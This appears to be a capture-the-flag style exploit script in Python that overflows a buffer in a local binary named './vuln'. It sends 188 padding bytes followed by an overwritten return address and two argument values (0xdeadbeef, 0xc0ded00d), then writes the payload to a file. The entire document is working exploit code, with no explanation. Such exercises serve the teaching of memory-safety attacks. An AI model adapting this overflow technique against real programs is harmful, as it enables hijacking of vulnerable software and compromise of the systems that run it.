import subprocess
import os
p = subprocess.Popen("./vuln", stdin=subprocess.PIPE, shell=True)
n = 188
input = [65] * n
input[n:] = [0xe6, 0x85, 0x04, 0x08, 0, 0, 0, 0, 0xef,
             0xbe, 0xad, 0xde, 0x0d, 0xd0, 0xde, 0xc0]
stdout, stderr = p.communicate(input=bytes(input))
new_file = open("input", "wb")
new_file.write(bytes(input))
